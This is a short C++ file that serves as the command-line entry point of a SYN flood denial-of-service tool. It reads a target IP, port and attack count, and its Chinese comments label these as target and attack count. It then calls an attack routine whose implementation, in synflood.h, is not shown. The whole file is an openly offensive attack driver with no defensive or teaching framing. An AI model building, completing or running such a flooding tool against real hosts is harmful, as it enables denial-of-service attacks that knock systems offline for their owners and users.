#include "synflood.h"
#include <iostream>

using namespace std;


int main(int argc,char *argv[])
{
    if(argc!=4){
        cout << "error args,you should input: sudo ./synFlood [src_addr] [src_port] [attack_times]" << endl;
        return 0;
    }

    //目标地址
    string ip_addr = argv[1];

    //目标端口
    int port = atoi(argv[2]);

    //攻击次数
    unsigned int flood_times = atoi(argv[3]);

    SynFlood syn_flood;
    if(syn_flood.init(ip_addr,port)==0){
        if(syn_flood.attack(flood_times)==0){
            cout << "done." << endl;
        }else{
            cout << "attack_fail" << endl;
        }
    }else{
        cout << "init_fail" << endl;
    }

    return 0;
}
